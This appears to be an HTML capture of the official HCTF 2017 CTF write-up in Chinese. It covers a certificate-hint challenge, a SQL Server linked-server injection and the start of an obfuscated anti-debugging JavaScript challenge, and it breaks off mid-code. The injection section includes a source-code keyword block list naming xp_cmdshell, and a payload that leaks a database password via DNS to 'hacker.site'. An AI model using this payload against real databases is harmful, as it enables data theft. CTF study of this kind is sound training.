 <!DOCTYPE HTML> <html lang=""> <head> <meta charset="UTF-8"> <meta content="text/html; charset=utf-8"http-equiv="Content-Type"> <title>2017HCTF · CTF Writeup</title> <meta content="IE=edge"http-equiv="X-UA-Compatible"/> <meta content=""name="description"> <meta content="GitBook 3.2.3"name="generator"> <meta content="Yunen <yunen@cqu.edu.cn>"name="author"> <link href="../gitbook/style.css"rel="stylesheet"> <link href="../gitbook/gitbook-plugin-cuav-chapters/cuav-chapters.css"rel="stylesheet"> <link href="../gitbook/gitbook-plugin-splitter/splitter.css"rel="stylesheet"> <link href="../gitbook/gitbook-plugin-highlight/website.css"rel="stylesheet"> <link href="../gitbook/gitbook-plugin-search-plus/search.css"rel="stylesheet"> <link href="../gitbook/gitbook-plugin-fancybox/jquery.fancybox.css"rel="stylesheet"> <link href="../gitbook/gitbook-plugin-fancybox/jquery.fancybox-buttons.css"rel="stylesheet"> <link href="../gitbook/gitbook-plugin-page-footer/footer.css"rel="stylesheet"> <link href="../gitbook/gitbook-plugin-theme-fexa/fexa.css"rel="stylesheet"> <meta content="true"name="HandheldFriendly"/> <meta content="width=device-width,initial-scale=1,user-scalable=no"name="viewport"> <meta content="yes"name="apple-mobile-web-app-capable"> <meta content="black"name="apple-mobile-web-app-status-bar-style"> <link href="../gitbook/images/apple-touch-icon-precomposed-152.png"rel="apple-touch-icon-precomposed"sizes="152x152"> <link href="../gitbook/images/favicon.ico"rel="shortcut icon"type="image/x-icon"> <link href="2018qiangwang.html"rel="next"/> <link href="2019starctf.html"rel="prev"/> <link href="/rss.xml"rel="alternate"type="application/rss+xml"title="CTF Writeup"/> <style>@media only screen and (max-width:640px){.book-header .hidden-mobile{display:none}}</style> <script>window["gitbook-plugin-github-buttons"]={buttons:[{user:"HackerYunen",repo:"CTFWP",type:"star",size:"small",count:"true"}]}</script> </head> <body> <div class="book"style="overflow:hidden"> <div class="header-inner"> <span class="title">CTF Writeup</span> <div role="search"id="book-search-input"> <input placeholder="Type to search"type="text"/> </div> <ul class="header-nav"> <li> <a href="http://www.ctfwp.com/"target="_blank">首页</a> </li><li> <a href="http://buuoj.cn/"target="_blank">BUUCTF 训练平台</a> </li> </ul> </div> <div class="book-summary"> <div class="book-summary-title">文档目录</div> <nav role="navigation"> <ul class="summary"> <li class="chapter"data-level="1.1"data-path="../"> <a href="../"> 介绍 </a> </li> <li class="chapter"data-level="1.2"data-path="../types/"> <a href="../types/"> 按类型区分 </a> <ul class="articles"> <li class="chapter"data-level="1.2.1"data-path="../types/web.html"> <a href="../types/web.html"> 网上练习题 </a> </li> <li class="chapter"data-level="1.2.2"data-path="../types/comp.html"> <a href="../types/comp.html"> 官方赛事题 </a> </li> </ul> </li> <li class="chapter"data-level="1.3"data-path="../years/"> <a href="../years/"> 按年份区分 </a> <ul class="articles"> <li class="chapter"data-level="1.3.1"data-path="../years/2020.html"> <a href="../years/2020.html"> 2019-2020 </a> </li> <li class="chapter"data-level="1.3.2"data-path="../years/2019.html"> <a href="../years/2019.html"> 2018-2019 </a> </li> <li class="chapter"data-level="1.3.3"data-path="../years/2018.html"> <a href="../years/2018.html"> 2017-2018 </a> </li> <li class="chapter"data-level="1.3.4"data-path="../years/2017.html"> <a href="../years/2017.html"> 2016-2017 </a> </li> <li class="chapter"data-level="1.3.5"data-path="../years/2016.html"> <a href="../years/2016.html"> 2015-2016 </a> </li> <li class="chapter"data-level="1.3.6"data-path="../years/2015.html"> <a href="../years/2015.html"> ????-2015 </a> </li> </ul> </li> <li class="chapter"data-level="1.4"data-path="../difficult/"> <a href="../difficult/"> 按难度区分 </a> <ul class="articles"> <li class="chapter"data-level="1.4.1"data-path="../difficult/easy.html"> <a href="../difficult/easy.html"> 相对简单 </a> </li> <li class="chapter"data-level="1.4.2"data-path="../difficult/mid.html"> <a href="../difficult/mid.html"> 难度中等 </a> </li> <li class="chapter"data-level="1.4.3"data-path="../difficult/diff.html"> <a href="../difficult/diff.html"> 难度较大 </a> </li> </ul> </li> <li class="chapter"data-level="1.5"data-path="all.html"> <a href="all.html"> 目前已收录 </a> <ul class="articles"> <li class="chapter"data-level="1.5.1"data-path="2019unctf.html"> <a href="2019unctf.html"> 2019UNCTF </a> </li> <li class="chapter"data-level="1.5.2"data-path="2019shendun.html"> <a href="2019shendun.html"> 2019上海神盾杯 </a> </li> <li class="chapter"data-level="1.5.3"data-path="2017huxiang.html"> <a href="2017huxiang.html"> 2017湖湘杯 </a> </li> <li class="chapter"data-level="1.5.4"data-path="2019sctf.html"> <a href="2019sctf.html"> 2019SCTF </a> </li> <li class="chapter"data-level="1.5.5"data-path="2019qiangwang.html"> <a href="2019qiangwang.html"> 2019强网杯 </a> </li> <li class="chapter"data-level="1.5.6"data-path="2019iscc.html"> <a href="2019iscc.html"> 2019ISCC </a> </li> <li class="chapter"data-level="1.5.7"data-path="oldbugku_web.html"> <a href="oldbugku_web.html"> 旧Bugku_Web </a> </li> <li class="chapter"data-level="1.5.8"data-path="2019starctf.html"> <a href="2019starctf.html"> 2019*CTF </a> </li> <li class="chapter active"data-level="1.5.9"data-path="2017hctf.html"> <a href="2017hctf.html"> 2017HCTF </a> </li> <li class="chapter"data-level="1.5.10"data-path="2018qiangwang.html"> <a href="2018qiangwang.html"> 2018强网杯Web </a> </li> <li class="chapter"data-level="1.5.11"data-path="2018ddctf.html"> <a href="2018ddctf.html"> 2018DDCTF </a> </li> <li class="chapter"data-level="1.5.12"data-path="2019national.html"> <a href="2019national.html"> 2019全国信安赛 </a> </li> <li class="chapter"data-level="1.5.13"data-path="2019ddctf.html"> <a href="2019ddctf.html"> 2019DDCTF </a> </li> <li class="chapter"data-level="1.5.14"data-path="2017national.html"> <a href="2017national.html"> 2017全国信安赛 </a> </li> <li class="chapter"data-level="1.5.15"data-path="2019xihulunjian.html"> <a href="2019xihulunjian.html"> 2019西湖论剑预选赛 </a> </li> <li class="chapter"data-level="1.5.16"data-path="shiyanbar_web.html"> <a href="shiyanbar_web.html"> 实验吧web部分 </a> </li> </ul> </li> <li class="chapter"data-level="1.6"data-path="../help.html"> <a href="../help.html"> 加入我们完善网站! </a> </li> <li class="chapter"data-level="1.7"data-path="../reply.html"> <a href="../reply.html"> 有问题?请在这里反馈! </a> </li> <li class="divider"></li> <li> <a href="https://www.gitbook.com"target="blank"class="gitbook-link"> Published with GitBook </a> </li> </ul> </nav> </div> <div class="book-anchor"style="overflow-y:auto;max-height:80%"> <div class="book-anchor-title">在这篇文章中:</div> <div class="book-anchor-body"> </div> </div> <div class="book-body"> <div class="body-inner"> <div class="book-header"role="navigation"> <h1> <i class="fa fa-circle-o-notch fa-spin"></i> <a href="..">2017HCTF</a> </h1> </div> <div class="page-wrapper"role="main"tabindex="-1"> <div class="page-inner"> <div class="search-plus"id="book-search-results"> <div class="search-noresults"> <section class="markdown-section normal"> <h1 id="2017hctf">2017HCTF</h1> <h2 id="&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;">&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF1A;</h2> <table> <thead> <tr> <th style="text-align:center">&#x7C7B;&#x578B;</th> <th style="text-align:center">&#x5E74;&#x4EFD;</th> <th style="text-align:center">&#x96BE;&#x5EA6;</th> </tr> </thead> <tbody> <tr> <td style="text-align:center">&#x5B98;&#x65B9;&#x8D5B;&#x4E8B;&#x9898;</td> <td style="text-align:center">2017</td> <td style="text-align:center">&#x96BE;</td> </tr> </tbody> </table> <h1 id="&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;">&#x9898;&#x76EE;&#x4E0B;&#x8F7D;&#xFF1A;</h1> <ul> <li><a href="https://github.com/vidar-team/HCTF2017"target="_blank">https://github.com/vidar-team/HCTF2017</a></li> </ul> <h1 id="&#x7F51;&#x4E0A;&#x516C;&#x5F00;wp&#xFF1A;">&#x7F51;&#x4E0A;&#x516C;&#x5F00;WP&#xFF1A;</h1> <ul> <li><a href="https://xz.aliyun.com/t/1589"target="_blank">https://xz.aliyun.com/t/1589</a></li> <li><a href="https://www.52pojie.cn/thread-662919-1-1.html"target="_blank">https://www.52pojie.cn/thread-662919-1-1.html</a></li> </ul> <h1 id="&#x672C;&#x7AD9;&#x5907;&#x4EFD;wp&#xFF1A;">&#x672C;&#x7AD9;&#x5907;&#x4EFD;WP&#xFF1A;</h1> <p><strong>&#x5B98;&#x65B9;WP</strong></p> <h2 id="&#x524D;&#x8A00;">&#x524D;&#x8A00;:</h2> <p>HCTF2017 Quals&#x5728;11&#x6708;12&#x65E5;&#x6B63;&#x5F0F;&#x843D;&#x4E0B;&#x5E37;&#x5E55;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x5F88;&#x9AD8;&#x5174;HCTF&#x7684;&#x4E0D;&#x65AD;&#x8FDB;&#x6B65;&#x88AB;&#x4EBA;&#x4EEC;&#x770B;&#x5728;&#x773C;&#x91CC;&#xFF0C;HCTF2017&#x7B2C;&#x4E00;&#x6B21;&#x767B;&#x9646;CTFTIME&#xFF0C;<code>&#x53C2;&#x52A0;&#x6BD4;&#x8D5B;&#x5E76;&#x83B7;&#x5F97;&#x5206;&#x6570;&#x7684;&#x961F;&#x4F0D;&#x8D85;&#x8FC7;<span class="token number">540</span>&#x53EA;</code>&#x3002;</p> <p>&#x4ECE;HCTF&#x521B;&#x529E;&#x4EE5;&#x6765;&#xFF0C;HCTF&#x4E00;&#x76F4;&#x8DF5;&#x884C;&#x7740;&#x505A;&#x66F4;&#x597D;&#x66F4;&#x68D2;&#x7684;CTF&#x6BD4;&#x8D5B;&#x7684;&#x51C6;&#x5219;&#xFF0C;&#x4ECE;2015&#x5E74;&#x7684;&#x53CD;&#x4F5C;&#x5F0A;&#x7CFB;&#x7EDF;&#x3001;&#x5168;&#x65B0;&#x7684;&#x6BD4;&#x8D5B;&#x673A;&#x5236;&#xFF0C;&#x5230;2016&#x5E74;&#x7684;&#x52A8;&#x6001;&#x79EF;&#x5206;&#x5236;&#xFF0C;HCTF&#x4E00;&#x76F4;&#x5728;&#x52AA;&#x529B;&#x5C06;CTF&#x53D8;&#x5F97;&#x66F4;&#x50CF;&#x4E00;&#x4E2A;hack game&#xFF01;</p> <p>&#x4ECA;&#x5E74;&#x6211;&#x4EEC;&#x7B2C;&#x4E00;&#x6B21;&#x5F15;&#x5165;&#x4E86;&#x5206;&#x65B9;&#x5411;&#x7684;&#x95EF;&#x5173;&#x673A;&#x5236;&#xFF0C;&#x5C06;&#x6BD4;&#x8D5B;&#x9898;&#x76EE;&#x5206;&#x4E3A; bin&#x3001;web&#x548C; extra &#x4E09;&#x4E2A;&#x5927;&#x7C7B;&#xFF0C;&#x6BCF;&#x4E00;&#x5927;&#x7C7B;&#x6709;&#x4E94;&#x5173;&#xFF0C;&#x53EA;&#x6709;&#x6EE1;&#x8DB3;&#x6BCF;&#x5173;&#x7684;&#x5F00;&#x653E;&#x6761;&#x4EF6;&#xFF0C;&#x624D;&#x80FD;&#x5F00;&#x653E;&#x8BE5;&#x5173;&#x3002;</p> <p>&#x5C3D;&#x7BA1;&#x89C4;&#x5219;&#x5BFC;&#x81F4;&#x7684;&#x7ED3;&#x679C;&#x4E0D;&#x7ADF;&#x5982;&#x4EBA;&#x610F;&#xFF0C;&#x4F46;&#x6211;&#x4EEC;&#x4ECD;&#x7136;&#x8FDB;&#x6B65;&#xFF0C;HCTF&#x4ECD;&#x5728;&#x53D8;&#x5F97;&#x66F4;&#x597D;&#x3002;</p> <h2 id="web">Web</h2> <h3 id="easysignin">easy_sign_in</h3> <p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x771F;&#x7684;&#x771F;&#x7684;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x8FDE;&#x63D0;&#x793A;&#x90FD;&#x975E;&#x5E38;&#x7684;&#x660E;&#x663E;&#x5C31;&#x662F;&#x53BB;&#x67E5;&#x770B;&#x8BC1;&#x4E66;&#x7684;&#x5185;&#x5BB9;&#x3002; &#x4ECE;&#x8BC1;&#x4E66;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x6761;flag in: 123.206.81.217 &#x6216;&#x8BB8;&#x6709;&#x4E9B;&#x6D4F;&#x89C8;&#x5668;&#x663E;&#x793A;&#x7684;&#x4F4D;&#x7F6E;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x8FD9;&#x6837;. &#x6253;&#x5F00;123.206.81.217 &#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230; flag: hctf{s00000_e4sy_sign_in}</p> <h3 id="boring-website">boring website</h3> <p>&#x9996;&#x5148;&#x626B;&#x76EE;&#x5F55;&#x53D1;&#x73B0;&#x6709;www.zip,&#x4E0B;&#x8F7D;&#x5E76;&#x6253;&#x5F00;&#x53D1;&#x73B0;&#x662F;&#x6E90;&#x7801;</p> <pre><code><span class="token operator">&lt;</span><span class="token operator">?</span>php
echo &quot;<span class="token constant">Bob</span> received a mission to write a login system on someone <span class="token keyword">else</span>&apos;s serve
r<span class="token punctuation">,</span> <span class="token keyword">and</span> he he only finished half of the work<span class="token operator">&lt;</span>br <span class="token operator">/</span><span class="token operator">&gt;</span>&quot;<span class="token punctuation">;</span>
echo <span class="token string">&quot;flag is hctf{what you get}&lt;br /&gt;&lt;br /&gt;&quot;</span><span class="token punctuation">;</span>
error_reporting<span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token operator">^</span><span class="token constant">E_NOTICE</span><span class="token operator">^</span><span class="token constant">E_WARNING</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
try <span class="token punctuation">{</span>
<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span> <span class="token string">&quot;sqlsrv:Server=*****;Database=not_here&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;oob&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
catch<span class="token punctuation">(</span> <span class="token constant">PDOException</span> <span class="token variable">$e</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
die<span class="token punctuation">(</span> <span class="token string">&quot;Error connecting to SQL Server&quot;</span><span class="token punctuation">.</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span>getMessage<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">#echo &quot;Connected to MySQL&lt;br /&gt;&quot;;</span>
echo <span class="token string">&quot;Connected to SQL Server&lt;br /&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span>\<span class="token punctuation">[</span><span class="token string">&apos;id&apos;</span>\<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span>&apos;<span class="token operator">/</span><span class="token constant">EXEC</span><span class="token operator">|</span>xp\_cmdshell<span class="token operator">|</span>sp\_configure<span class="token operator">|</span>xp_reg<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token constant">CREATE</span><span class="token operator">|</span><span class="token constant">DROP</span><span class="token operator">|</span>declare
<span class="token operator">|</span><span class="token keyword">if</span><span class="token operator">|</span>insert<span class="token operator">|</span>into<span class="token operator">|</span>outfile<span class="token operator">|</span>dumpfile<span class="token operator">|</span>sleep<span class="token operator">|</span>wait<span class="token operator">|</span>benchmark<span class="token operator">/</span>i&apos;<span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
die<span class="token punctuation">(</span><span class="token string">&apos;NoNoNo&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">&quot;select message from not\_here\_too where id = $id&quot;</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>link server<span class="token punctuation">:</span> <span class="token constant">O</span>
n linkname<span class="token symbol">:mysql</span>
<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span>query<span class="token punctuation">(</span> <span class="token variable">$query</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">@$row</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span>fetch<span class="token punctuation">(</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token operator">/</span><span class="token operator">/</span><span class="token constant">TO</span> <span class="token constant">DO</span><span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">/</span><span class="token operator">/</span><span class="token constant">It</span>&apos;s time to sleep<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span></code></pre><p>&#x53D1;&#x73B0;&#x5E94;&#x8BE5;&#x662F;<code>sql server</code>&#x7528;<code>linkserver</code>&#x6765;&#x8FDE;&#x63A5;<code>mysql</code>&#x3002;&#x6240;&#x4EE5;&#x53BB;&#x67E5;&#x4E86;&#x4E00;&#x6CE2;<code>linkserver</code>&#x7684;&#x7528;&#x6CD5;&#xFF0C;&#x4EE5;&#x53CA;&#x7ED3;&#x5408;&#x6CE8;&#x91CA;&#x53EF;&#x5F97;<code>select <span class="token operator">*</span> from openquery<span class="token punctuation">(</span>mysql<span class="token punctuation">,</span><span class="token string">&apos;select xxx&apos;</span><span class="token punctuation">)</span></code>&#x53EF;&#x4EE5;&#x4ECE;mysql&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x5F97;&#x4FE1;&#x606F;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#xFF0C;sleep&#x51FD;&#x6570;&#x4E5F;&#x88AB;ban&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x770B;&#x5230;<code>oob</code>&#x7684;&#x63D0;&#x793A;&#xFF0C;&#x53BB;&#x67E5;&#x4E86;&#x4E00;&#x6CE2;<code>mysql out<span class="token operator">-</span>of<span class="token operator">-</span>band</code>&#xFF0C;&#x53D1;&#x73B0;<code>load_file</code>&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;dns&#x901A;&#x9053;&#x628A;&#x6240;&#x67E5;&#x5F97;&#x7684;&#x6570;&#x636E;&#x5E26;&#x51FA;&#x6765;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x8FC7;&#x7A0B;&#x5C31;&#x662F;&#x5341;&#x5206;&#x5E38;&#x89C1;&#x7B80;&#x5355;&#x7684;mysql&#x6CE8;&#x5165;&#x7684;&#x6D41;&#x7A0B;&#x3002;<br>&#x6700;&#x7EC8;&#x7684;payload: <code><span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> union select <span class="token operator">*</span> from openquery<span class="token punctuation">(</span>mysql<span class="token punctuation">,</span><span class="token string">&apos;select load_file(concat(&quot;\\\\&quot;,(select password from secret),&quot;.hacker.site\\a.txt&quot;))&apos;</span><span class="token punctuation">)</span></code></p> <p>dnslog &#x5E73;&#x53F0;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x642D;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;ceye</p> <p><a href="http://www.mottoin.com/96463.html"target="_blank">mysql out of band</a></p> <h3 id="babycrack">babycrack</h3> <pre><code>    babycrack

    <span class="token constant">Description</span> 
    just babycrack
    <span class="token number">1.</span>flag<span class="token punctuation">.</span>substr<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">&quot;333&quot;</span>
    <span class="token number">2.</span>flag<span class="token punctuation">.</span>substr<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">&quot;3&quot;</span>
    <span class="token number">3.</span><span class="token constant">Every</span> word makes sence<span class="token punctuation">.</span>
    <span class="token number">4.</span>sha256<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">&quot;d3f154b641251e319855a73b010309a168a12927f3873c97d2e5163ea5cbb443&quot;</span> 

    <span class="token constant">Now</span> <span class="token constant">Score</span> <span class="token number">302.93</span>
    <span class="token constant">Team</span> solved <span class="token number">45</span></code></pre><p>&#x8FD8;&#x662F;&#x5F88;&#x62B1;&#x6B49;&#x9898;&#x76EE;&#x7684;&#x9A8C;&#x8BC1;&#x903B;&#x8F91;&#x8FD8;&#x662F;&#x51FA;&#x73B0;&#x4E86;&#x4E0D;&#x53EF;&#x9006;&#x63A8;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x88AB;&#x8FEB;&#x5728;&#x6BD4;&#x8D5B;&#x4E2D;&#x9014;&#x52A0;&#x5165;4&#x4E2A;hint&#x6765;&#x4FEE;&#x590D;&#x95EE;&#x9898;&#xFF0C;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x6765;&#x6162;&#x6162;&#x770B;&#x770B;&#x4EE3;&#x7801;&#x3002;</p> <p>&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x7531;&#x53CD;&#x8C03;&#x8BD5;+&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;+&#x903B;&#x8F91;&#x6DF7;&#x6DC6;3&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x8BF4;&#x9898;&#x76EE;&#x6BEB;&#x65E0;&#x610F;&#x4E49;&#x5B8C;&#x5168;&#x4E3A;&#x4E86;&#x51FA;&#x9898;&#x800C;&#x51FA;&#x9898;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x4EE3;&#x7801;&#x786E;&#x5B9E;&#x6700;&#x6700;&#x771F;&#x5B9E;&#x7684;&#x524D;&#x7AEF;&#x4EE3;&#x7801;&#xFF0C;&#x73B0;&#x5728;&#x8BB8;&#x591A;&#x7AD9;&#x70B9;&#x90FD;&#x4F1A;&#x9009;&#x62E9;&#x4F7F;&#x7528;&#x53CD;&#x8C03;&#x8BD5;+&#x6DF7;&#x6DC6;+&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x7684;&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;&#x6765;&#x6DF7;&#x6DC6;&#x90E8;&#x5206;&#x524D;&#x7AEF;&#x4EE3;&#x7801;&#x3002;</p> <p>&#x51FA;&#x9898;&#x601D;&#x8DEF;&#x4E3B;&#x8981;&#x6709;&#x4E24;&#x7BC7;&#x6587;&#x7AE0;&#xFF1A;</p> <p><a href="http://www.jianshu.com/p/9148d215c119"target="_blank">http://www.jianshu.com/p/9148d215c119</a><br><a href="https://zhuanlan.zhihu.com/p/29214928"target="_blank">https://zhuanlan.zhihu.com/p/29214928</a></p> <p>&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x4E3B;&#x8981;&#x662F;&#x5728;&#x6211;&#x5206;&#x6790;chrome&#x62D3;&#x5C55;&#x540E;&#x95E8;&#x65F6;&#x5019;&#x6784;&#x601D;&#x7684;&#xFF0C;&#x4EE3;&#x7801;&#x540C;&#x6837;&#x7ECF;&#x8FC7;&#x4E86;&#x5F88;&#x591A;&#x91CD;&#x7684;&#x6DF7;&#x6DC6;&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x6765;&#x4E00;&#x6B65;&#x6B65;&#x89E3;&#x91CA;&#x3002;</p> <h4 id="&#x53CD;&#x8C03;&#x8BD5;">&#x53CD;&#x8C03;&#x8BD5;</h4> <p>&#x7B2C;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x53CD;&#x8C03;&#x8BD5;&#xFF0C;&#x5F53;&#x5728;&#x9875;&#x9762;&#x5185;&#x4F7F;&#x7528;F12&#x6765;&#x8C03;&#x8BD5;&#x4EE3;&#x7801;&#x65F6;&#xFF0C;&#x4F1A;&#x5361;&#x6B7B;&#x5728;debugger&#x4EE3;&#x7801;&#x5904;&#x3002;<br> <a href="http://static.zybuluo.com/LoRexxar/t1ve1pnu9lq3m99rzrlrq3vn/image.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/t1ve1pnu9lq3m99rzrlrq3vn/image.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <p>&#x8FD9;&#x91CC;&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#x5C31;&#x662F;&#x8611;&#x83C7;&#x8857;&#x7684;&#x767B;&#x9646;&#x9A8C;&#x8BC1;&#x4EE3;&#x7801;&#x3002;<br> <a href="http://static.zybuluo.com/LoRexxar/5u1n14snq6e3mzsld4id8jpp/image.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/5u1n14snq6e3mzsld4id8jpp/image.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <p>&#x5177;&#x4F53;&#x4EE3;&#x7801;&#x662F;&#x8FD9;&#x6837;&#x7684;</p> <p><code>eval<span class="token punctuation">(</span>function<span class="token punctuation">(</span>p<span class="token punctuation">,</span>a<span class="token punctuation">,</span>c<span class="token punctuation">,</span>k<span class="token punctuation">,</span>e<span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token operator">=</span>function<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> c<span class="token punctuation">.</span>toString<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token string">&apos;&apos;</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token regex">/^/</span><span class="token punctuation">,</span><span class="token builtin">String</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">while</span><span class="token punctuation">(</span>c<span class="token operator">--</span><span class="token punctuation">)</span>r<span class="token punctuation">[</span>e<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span>k<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">||</span>e<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>k<span class="token operator">=</span><span class="token punctuation">[</span>function<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> r<span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>e<span class="token operator">=</span>function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span><span class="token string">&apos;\\w+&apos;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>c<span class="token operator">--</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token operator">=</span>p<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">&apos;\\b&apos;</span><span class="token operator">+</span>e<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;\\b&apos;</span><span class="token punctuation">,</span><span class="token string">&apos;g&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&apos;(3(){(3 a(){7{(3 b(2){9((\&apos;\&apos;+(2/2)).5!==1||2%g===0){(3(){}).8(\&apos;4\&apos;)()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();&apos;</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token string">&apos;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&apos;</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&apos;|&apos;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></p> <p>&#x7F8E;&#x5316;&#x4E00;&#x4E0B;</p> <pre><code>    <span class="token punctuation">(</span>function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span>function a<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            try <span class="token punctuation">{</span>
